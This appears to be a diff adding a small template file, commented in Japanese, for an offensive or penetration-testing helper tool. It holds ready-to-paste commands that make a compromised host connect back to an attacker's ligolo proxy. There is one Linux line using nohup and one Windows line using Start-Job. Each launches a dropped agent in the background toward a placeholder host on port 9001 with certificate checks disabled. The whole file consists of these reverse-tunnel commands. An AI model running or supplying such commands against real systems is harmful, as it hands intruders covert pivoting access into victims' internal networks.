@@ -1,0 +1,3 @@
+# ligolo の agent を手元の proxy につなぐ形（値・表示名・説明。相手に貼る。相手の OS で選ぶ）
+nohup /tmp/agent --connect <connect>:9001 --ignore-cert &	Linux	バックグラウンドで（nohup）
+Start-Job -ScriptBlock { C:\Users\Public\agent.exe --connect <connect>:9001 --ignore-cert }	Windows	バックグラウンドで（Start-Job）。絶対パスで
